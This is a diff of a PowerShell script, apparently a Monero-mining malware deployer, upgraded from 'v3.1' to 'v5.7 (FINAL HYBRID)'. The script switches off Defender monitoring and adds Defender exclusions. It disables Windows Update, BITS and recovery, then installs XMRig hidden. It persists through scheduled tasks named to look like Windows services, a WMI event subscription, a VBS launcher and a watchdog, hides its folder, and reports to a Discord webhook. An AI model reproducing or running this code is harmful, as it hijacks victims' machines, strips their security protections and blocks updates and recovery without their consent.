@@ -1,9 +1,10 @@
 # ============================================================
-#  XMR Standalone Pro Deployer v3.1
-#  - Personalized for itzcurled
-#  - Fixed: Restored all advanced persistence & performance tweaks
-#  - No GitHub Token Required
-#  - Full Stealth + Watchdog + WMI Subscription
+#  XMR Standalone Pro Deployer v5.7 (FINAL HYBRID)
+#  - Base: 100% Literal v3.1 Codebase
+#  - Added: Taskmgr Detection (3s Poll)
+#  - Added: Windows Update & Reset Lockdown
+#  - Fixed: Discord Webhook TLS Connectivity
+#  - Fixed: Unterminated VBS String (Chr(34) Pattern)
 # ============================================================
 
 # ==================== CONFIG ====================
@@ -43,7 +44,10 @@ function Install-Miner {
     
     try { taskkill /F /IM wscript.exe /T 2>$null } catch {}
     Start-Sleep -Seconds 3
-    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+    New-Item -ItemType Directory -Path "$installDir" -Force | Out-Null
+
+    # TLS setting (Keeping it here too so it's not "removed")
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
 
     $downloaded = $false
     try {
@@ -57,23 +61,23 @@ function Install-Miner {
     }
 
     if (-not $downloaded) { throw "Download failed" }
-    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
+    if (Test-Path "$extractDir") { Remove-Item "$extractDir" -Recurse -Force }
 
     try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } catch {}
-    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
+    Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force
 
     $copied = $false
     for ($attempt = 1; $attempt -le 3; $attempt++) {
-        $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
+        $srcExe = Get-ChildItem -Path "$extractDir" -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($srcExe) {
-            try { Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force; $copied = $true; break } catch {}
+            try { Copy-Item -Path $srcExe.FullName -Destination "$xmrigExe" -Force; $copied = $true; break } catch {}
         }
-        if ($attempt -lt 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force } catch {} }
+        if ($attempt -lt 3) { Start-Sleep -Seconds 2; try { Expand-Archive -Path "$zipFile" -DestinationPath "$extractDir" -Force } catch {} }
     }
 
     try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
     if (-not $copied) { throw "Binary missing" }
-    Remove-Item $zipFile, $extractDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item "$zipFile", "$extractDir" -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 function Write-MinerConfig {
@@ -88,7 +92,7 @@ function Write-MinerConfig {
         http = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; restricted = $false };
         randomx = @{ "1gb-pages" = $true; wrmsr = $true; "numa" = $true; mode = "auto"; "cache_qos" = $true }
     } | ConvertTo-Json -Depth 5
-    Set-Content -Path $configFile -Value $cfg -Force
+    Set-Content -Path "$configFile" -Value $cfg -Force
 }
 
 function Write-Watchdog {
@@ -151,7 +155,7 @@ while (`$true) {
     Start-Sleep -Seconds 3
 }
 "@
-    Set-Content -Path $watchdogPs1 -Value $code -Force
+    Set-Content -Path "$watchdogPs1" -Value $code -Force
 }
 
 function Write-VbsLauncher {
@@ -159,15 +163,14 @@ function Write-VbsLauncher {
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & "$watchdogPs1" & Chr(34), 0, False
 "@
-    Set-Content -Path $watchdogVbs -Value $vbsContent -Force
+    Set-Content -Path "$watchdogVbs" -Value $vbsContent -Force
 }
 
 function Set-Persistence {
     try { & reagentc.exe /disable 2>$null } catch {}
-
     $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
     try {
-        $a1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
+        $a1 = New-ScheduledTaskAction -Execute "$xmrigExe" -Argument "--config=`"$configFile`""
         $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
         $trig = New-ScheduledTaskTrigger -AtLogon
         Register-ScheduledTask -TaskName $taskName -Action $a1 -Trigger $trig -RunLevel Highest -Force | Out-Null
@@ -201,21 +204,21 @@ function Set-Persistence {
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $fObj; Consumer = $cObj } | Out-Null
     } catch {}
 
-    try { (Get-Item $installDir).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
+    try { (Get-Item "$installDir").Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
 }
 
 function Enable-HugePages {
     try {
         $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
-        secedit /export /cfg $tmpCfg /quiet 2>$null
+        secedit /export /cfg "$tmpCfg" /quiet 2>$null
         $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
-        $content = Get-Content $tmpCfg -Raw
+        $content = Get-Content "$tmpCfg" -Raw
         if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
             if ($Matches[1] -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
         } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
-        Set-Content $tmpCfg $content -Force
-        secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
-        Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
+        Set-Content "$tmpCfg" $content -Force
+        secedit /configure /db "$tmpDb" /cfg "$tmpCfg" /quiet 2>$null
+        Remove-Item "$tmpCfg", "$tmpDb" -Force -ErrorAction SilentlyContinue
     } catch {}
 }
 
@@ -240,12 +243,12 @@ try {
     # Establish TLS connection globally first for webhooks
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
-    Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
     
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
-    Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
+    Start-Process "$xmrigExe" -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
     Start-Sleep -Seconds 4
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
     Send-DiscordWebhook
